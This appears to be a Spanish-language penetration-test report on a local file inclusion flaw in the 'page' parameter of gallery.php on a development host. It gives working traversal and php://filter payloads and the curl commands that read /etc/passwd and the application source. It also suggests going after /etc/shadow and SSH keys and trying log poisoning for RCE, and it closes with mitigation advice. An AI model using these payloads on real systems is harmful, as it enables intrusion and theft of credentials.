# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T08:24:14Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Fue posible leer ficheros del sistema (por ejemplo `/etc/passwd`) mediante traversal y mediante el wrapper `php://filter`, confirmando acceso a información sensible del servidor web.

Evidencia técnica
------------------
Cabeceras iniciales (extraídas con curl):
- Server: Apache/2.4.65 (Debian)
- X-Powered-By: PHP/8.1.33

Punto vulnerable
----------------
- Archivo: /gallery.php
- Parámetro: `page` (GET)

Comandos exactos ejecutados
--------------------------
- curl -s -S -D /tmp/headers.txt --max-time 15 http://web.dev.local:8081 -o /tmp/body.html
- curl -s -S "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd" -o /tmp/lfi_etc
- curl -s -S "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd" -o /tmp/lfi_b64
- curl -s -S "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php" -o /tmp/lfi_src

Payloads usados (ejemplos)
-------------------------
- gallery.php?page=../../../../../../etc/passwd
- gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
- gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php

Resultados y pruebas
--------------------
- La petición con traversal devolvió el contenido de `/etc/passwd` embebido en la plantilla HTML (sección content). Fragmento obtenido:
  "root:x:0:0:root:/root:/bin/bash\n...\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"

- El uso de `php://filter` mostró el intento de leer y codificar en base64, y devolvió la cadena base64 del contenido objetivo cuando el recurso existía o un mensaje de error señalando el recurso solicitado.

Impacto
-------
- Divulgación de información: Lectura de archivos del sistema e información de usuarios del sistema (lista de cuentas). Esto facilita ataques posteriores (recolección de usuarios, fuerza bruta, intentos de escalado).
- Potencial escalada: Si se accede a ficheros de configuración (por ejemplo `.env`, `config.php`, claves privadas) se podrían obtener credenciales o secretos que permitan acceso adicional.

Acciones de explotación adicionales (recomendadas para pruebas autorizadas)
-----------------------------------------------------------------------
- Intentar leer `/etc/shadow`, `~/.ssh/id_rsa` y archivos de configuración de la aplicación (e.g., `config.php`, `.env`) usando el wrapper `php://filter` o distintas cantidades de traversal.
- Explorar técnicas de Log Poisoning y lectura de `/proc/self/environ` para lograr RCE si es viable.

Recomendaciones de mitigación
-----------------------------
1. Validar y sanitizar estrictamente el parámetro `page` (whitelist de nombres de páginas válidas).
2. Evitar incluir archivos basados en entradas del usuario; usar mapeos internos (switch/case).
3. Deshabilitar wrappers peligrosos si no son necesarios y endurecer la configuración de PHP (open_basedir, disable_functions si aplica).
4. Evitar mostrar errores y rutas absolutas en producción; ajustar display_errors y log_errors.
5. Revisar permisos de archivos sensibles (`/etc/shadow`, claves privadas) y minimizar el acceso del usuario del servidor web.

Conclusión
----------
Se confirmó una vulnerabilidad LFI y se explotó con éxito para leer `/etc/passwd`. Riesgo alto por posible acceso a información sensible y escalada posterior.

Archivo de evidencia generado por esta auditoría:
- /tmp/lfi_etc (respuesta cruda de lectura de /etc/passwd)
- /tmp/lfi_b64 (respuesta base64 con php://filter)
- /tmp/lfi_src (lectura codificada de gallery.php)

Fin del informe.
